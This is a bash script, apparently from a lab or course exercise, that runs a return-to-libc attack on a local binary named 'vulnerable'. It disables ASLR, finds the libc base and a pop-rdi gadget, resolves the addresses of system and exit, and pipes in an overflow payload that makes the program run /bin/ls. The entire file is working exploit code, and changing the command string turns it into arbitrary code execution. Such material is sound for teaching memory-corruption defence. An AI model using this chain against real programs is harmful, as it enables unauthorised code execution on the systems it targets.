#!/bin/bash

#rm -f /tmp/vuln-input
#mkfifo /tmp/vuln-input

libcloc=/lib/x86_64-linux-gnu/libc.so.6 # $(locate x86_64-linux-gnu/libc.so.6 | head -n 1)
gadget=0x$(xxd -c1 -p $libcloc | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}')
#$tail -f /tmp/vuln-input | setarch `arch` -R ./vulnerable > dump.txt &
#tail -f /tmp/vuln-input | setarch `arch` -R ./vulnerable &
#pid=$!
pid=$(ps -C vulnerable -o pid --no-headers | tr -d ' ')

libc=0x$(grep libc /proc/$pid/maps | grep r-xp | awk '{split($0,a,"-"); print a[1]}')
#libc=0x7ffff7a0d000

system_offset=0x$(nm -D $libcloc | grep '\<system\>' | awk '{print $1}')
exit_offset=0x$(nm -D $libcloc | grep '\<exit\>' | awk '{print $1}')

# Write some input to kill vulnerable process
#echo "" > /tmp/vuln-input
#buffer_addr=$(cat dump.txt | head -n 1)
#rm dump.txt

buffer_addr=$(echo test | setarch `arch` -R ./vulnerable | head -n 1)

echo libc.so.6 location: $libcloc
echo gadget location: $gadget
echo vulnerable pid: $pid
echo libc.so.6 address: $libc
echo system offset: $system_offset
echo exit offset: $exit_offset
echo buffer address: $buffer_addr

#output=$(echo Bob | setarch `arch` -R ./vulnerable)
#echo $output

#(echo -n /bin/ls | xxd -p; printf %0514d 0; printf %016x $(($libc+$gadget)) | tac -rs..; printf %016x $buffer_addr | tac -rs..; printf %016x $(($libc+$system_offset)) | tac -rs..; printf %016x $(($libc+$exit_offset)) | tac -rs..) | xxd -r -p > exploit.bin
(echo -n /bin/ls | xxd -p; printf %0514d 0; printf %016x $(($libc+$gadget)) | tac -rs..; printf %016x $buffer_addr | tac -rs..; printf %016x $(($libc+$system_offset)) | tac -rs..; printf %016x $(($libc+$exit_offset)) | tac -rs..) | xxd -r -p | setarch `arch` -R ./vulnerable
